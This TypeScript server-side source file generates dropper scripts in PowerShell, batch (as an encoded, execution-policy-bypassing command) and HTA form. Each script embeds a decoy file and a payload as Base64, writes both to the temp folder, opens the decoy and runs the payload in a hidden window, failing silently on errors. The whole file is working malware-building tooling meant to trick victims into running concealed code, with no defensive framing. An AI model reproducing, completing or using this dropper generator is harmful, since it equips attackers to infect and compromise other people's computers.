
'use server';

import { z } from 'zod';

const FileInputSchema = z.object({
  name: z.string(),
  content: z.string(), // Base64 Data URI
});

const MergePayloadsInputSchema = z.object({
  payload: FileInputSchema,
  benign: FileInputSchema,
  outputFormat: z.enum(['ps1', 'bat', 'hta', 'js', 'vbs']),
});

type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;

type MergePayloadsOutput = {
  success: boolean;
  scriptContent?: string;
  error?: string;
};

// Helper function to decode a data URI to a Base64 string
function decodeDataUri(dataUri: string): string {
    const parts = dataUri.split(',');
    if (parts.length !== 2) {
        throw new Error('Invalid Data URI format');
    }
    return parts[1];
}

const generatePowershellDropper = (payloadName: string, payloadBase64: string, benignName: string, benignBase64: string): string => {
    return `
$tempPath = $env:TEMP
$benignFilePath = Join-Path $tempPath "${benignName}"
$payloadFilePath = Join-Path $tempPath "${payloadName}"

try {
    $benignFileBase64 = @"
${benignBase64}
"@
    $payloadFileBase64 = @"
${payloadBase64}
"@

    [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
    [IO.File]::WriteAllBytes($payloadFilePath, [System.Convert]::FromBase64String($payloadFileBase64))

    Start-Process $benignFilePath
    Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
} catch {
    # Fail silently
}
`;
};


/**
 * Generates a dropper script that embeds two files.
 * When run, it drops the benign file, opens it, and executes the payload.
 */
export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
  try {
    const validatedInput = MergePayloadsInputSchema.parse(input);
    const { payload, benign, outputFormat } = validatedInput;

    const payloadBase64 = decodeDataUri(payload.content);
    const benignBase64 = decodeDataUri(benign.content);
    
    let scriptContent = '';

    switch (outputFormat) {
        case 'ps1':
            scriptContent = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64);
            break;
        
        case 'bat':
            const psScript = generatePowershellDropper(payload.name, payloadBase64, benign.name, benignBase64);
            const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
            scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
            break;

        case 'hta':
            const vbsPayload = `
                Set objShell = CreateObject("WScript.Shell")
                Set objFSO = CreateObject("Scripting.FileSystemObject")
                
                tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
                benignFilePath = tempPath & "\\${benign.name}"
                payloadFilePath = tempPath & "\\${payload.name}"

                benignB64 = "${benignBase64}"
                payloadB64 = "${payloadBase64}"

                Call Base64ToFile(benignB64, benignFilePath)
                Call Base64ToFile(payloadB64, payloadFilePath)
                
                objShell.Run "cmd /c """ & benignFilePath & """", 0, True
                objShell.Run "cmd /c """ & payloadFilePath & """", 0, False ' Run payload hidden

                ' Close the HTA window
                window.close()

                Sub Base64ToFile(B64, FileName)
                    Dim oXML, oNode
                    Set oXML = CreateObject("MSXML2.DOMDocument")
                    Set oNode = oXML.CreateElement("base64")
                    oNode.DataType = "bin.base64"
                    oNode.Text = B64
                    With CreateObject("ADODB.Stream")
                        .Type = 1 ' adTypeBinary
                        .Open
                        .Write oNode.NodeTypedValue
                        .SaveToFile FileName, 2 ' adSaveCreateOverWrite
                        .Close
                    End With
                End Sub
            `;
            scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
            break;

        case 'js':
        case 'vbs':
            // These require more complex dropper logic using WScript.Shell
            // For now, return an error that it's not implemented yet.
             return {
              success: false,
              error: `Output format '${outputFormat}' is not yet fully supported for standalone script generation.`,
            };

        default:
             return { success: false, error: 'Invalid or unsupported output format.' };
    }

    return {
      success: true,
      scriptContent: scriptContent,
    };
  } catch (e) {
    console.error("Payload merging failed:", e);
    const message = e instanceof Error ? e.message : 'An unknown error occurred.';
    return {
      success: false,
      error: `Failed to generate dropper script: ${message}`,
    };
  }
}
